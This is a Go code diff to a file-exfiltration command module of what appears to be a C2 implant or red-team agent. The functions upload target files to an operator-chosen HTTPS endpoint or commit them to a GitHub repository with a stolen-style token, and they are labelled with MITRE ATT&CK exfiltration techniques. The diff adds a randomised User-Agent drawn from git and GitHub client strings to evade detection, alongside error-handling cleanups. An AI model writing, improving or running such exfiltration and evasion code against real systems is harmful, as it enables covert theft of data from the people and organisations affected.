@@ -2,6 +2,7 @@ package commands
 
 import (
 	"bytes"
+	"crypto/rand"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
@@ -36,23 +37,23 @@ type cloudExfilParams struct {
 // MITRE ATT&CK: T1567 (Exfiltration Over Web Service)
 func compressExfilHTTPS(task structs.Task, params CompressParams) structs.CommandResult {
 	if params.Path == "" {
-		return errorResult("Error: 'path' is required (file to exfiltrate)")
+		return errorResult("'path' is required (file to exfiltrate)")
 	}
 
 	// Parse cloud-specific params from the output field (JSON string)
 	var cloud cloudExfilParams
 	if params.Output != "" {
 		if err := json.Unmarshal([]byte(params.Output), &cloud); err != nil {
-			return errorf("Error parsing cloud params from 'output' field: %v\nExpected JSON: {\"url\":\"...\",\"method\":\"PUT\",\"headers\":{},\"chunk_size\":0,\"delay\":0}", err)
+			return errorf("parsing cloud params from 'output' field: %v\nExpected JSON: {\"url\":\"...\",\"method\":\"PUT\",\"headers\":{},\"chunk_size\":0,\"delay\":0}", err)
 		}
 	}
 
 	if cloud.URL == "" {
-		return errorResult("Error: 'url' is required in cloud params. Set output to JSON: {\"url\":\"https://...\"}")
+		return errorResult("'url' is required in cloud params. Set output to JSON: {\"url\":\"https://...\"}")
 	}
 
 	if !strings.HasPrefix(cloud.URL, "https://") {
-		return errorResult("Error: URL must use HTTPS for exfiltration")
+		return errorResult("URL must use HTTPS for exfiltration")
 	}
 
 	if cloud.Method == "" {
@@ -60,24 +61,24 @@ func compressExfilHTTPS(task structs.Task, params CompressParams) structs.Comman
 	}
 	cloud.Method = strings.ToUpper(cloud.Method)
 	if cloud.Method != "PUT" && cloud.Method != "POST" {
-		return errorf("Error: method must be PUT or POST (got %s)", cloud.Method)
+		return errorf("method must be PUT or POST (got %s)", cloud.Method)
 	}
 
 	archivePath, err := filepath.Abs(params.Path)
 	if err != nil {
-		return errorf("Error resolving path: %v", err)
+		return errorf("resolving path: %v", err)
 	}
 
 	info, err := os.Stat(archivePath)
 	if err != nil {
-		return errorf("Error accessing file: %v", err)
+		return errorf("accessing file: %v", err)
 	}
 	fileSize := info.Size()
 
 	// Hash the file for integrity
 	fileHash, err := hashFileSHA256(archivePath)
 	if err != nil {
-		return errorf("Error hashing file: %v", err)
+		return errorf("hashing file: %v", err)
 	}
 
 	// Create HTTPS client
@@ -124,7 +125,10 @@ func compressExfilHTTPS(task structs.Task, params CompressParams) structs.Comman
 		ArchivePath:  archivePath,
 		Status:       "transferred",
 	}
-	resultJSON, _ := json.Marshal(result)
+	resultJSON, err := json.Marshal(result)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
+	}
 	return successResult(string(resultJSON))
 }
 
@@ -253,22 +257,22 @@ func chunkedUpload(task structs.Task, client *http.Client, cloud cloudExfilParam
 // MITRE ATT&CK: T1567.001 (Exfiltration to Code Repository)
 func compressExfilGitHub(task structs.Task, params CompressParams) structs.CommandResult {
 	if params.Path == "" {
-		return errorResult("Error: 'path' is required (file to exfiltrate)")
+		return errorResult("'path' is required (file to exfiltrate)")
 	}
 
 	// Parse GitHub params from output field
 	var gh githubExfilParams
 	if params.Output != "" {
 		if err := json.Unmarshal([]byte(params.Output), &gh); err != nil {
-			return errorf("Error parsing GitHub params: %v\nExpected: {\"token\":\"ghp_...\",\"repo\":\"owner/repo\",\"path\":\"data/file.dat\"}", err)
+			return errorf("parsing GitHub params: %v\nExpected: {\"token\":\"ghp_...\",\"repo\":\"owner/repo\",\"path\":\"data/file.dat\"}", err)
 		}
 	}
 
 	if gh.Token == "" {
-		return errorResult("Error: 'token' required (GitHub PAT with repo scope)")
+		return errorResult("'token' required (GitHub PAT with repo scope)")
 	}
 	if gh.Repo == "" {
-		return errorResult("Error: 'repo' required (owner/repo format)")
+		return errorResult("'repo' required (owner/repo format)")
 	}
 	if gh.FilePath == "" {
 		gh.FilePath = fmt.Sprintf("data/%s.dat", randomStagingName())
@@ -276,12 +280,12 @@ func compressExfilGitHub(task structs.Task, params CompressParams) structs.Comma
 
 	archivePath, err := filepath.Abs(params.Path)
 	if err != nil {
-		return errorf("Error resolving path: %v", err)
+		return errorf("resolving path: %v", err)
 	}
 
 	data, err := os.ReadFile(archivePath)
 	if err != nil {
-		return errorf("Error reading file: %v", err)
+		return errorf("reading file: %v", err)
 	}
 
 	fileHash := sha256Hex(data)
@@ -306,16 +310,26 @@ func compressExfilGitHub(task structs.Task, params CompressParams) structs.Comma
 	if gh.SHA != "" {
 		reqBody["sha"] = gh.SHA
 	}
-	bodyJSON, _ := json.Marshal(reqBody)
+	bodyJSON, err := json.Marshal(reqBody)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
+	}
 
 	req, err := http.NewRequest("PUT", apiURL, bytes.NewReader(bodyJSON))
 	if err != nil {
-		return errorf("Error creating request: %v", err)
+		return errorf("creating request: %v", err)
 	}
 	req.Header.Set("Authorization", "Bearer "+gh.Token)
 	req.Header.Set("Accept", "application/vnd.github+json")
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", "git/2.45.0")
+	gitUAs := []string{
+		"git/2.39.5", "git/2.40.3", "git/2.41.2", "git/2.42.3", "git/2.43.5",
+		"git/2.44.2", "git/2.45.3", "git/2.46.1", "git/2.47.0", "git/2.47.1",
+		"GitHub-Hookshot/1a2b3c4", "github-actions/2.0", "JGit/6.9.0",
+	}
+	var b [1]byte
+	rand.Read(b[:])
+	req.Header.Set("User-Agent", gitUAs[int(b[0])%len(gitUAs)])
 
 	client := &http.Client{Timeout: 5 * time.Minute}
 	resp, err := client.Do(req)
@@ -357,7 +371,10 @@ func compressExfilGitHub(task structs.Task, params CompressParams) structs.Comma
 		CleanedUp: cleanedUp,
 		Status:    "committed",
 	}
-	resultJSON, _ := json.Marshal(result)
+	resultJSON, err := json.Marshal(result)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
+	}
 	return successResult(string(resultJSON))
 }
 
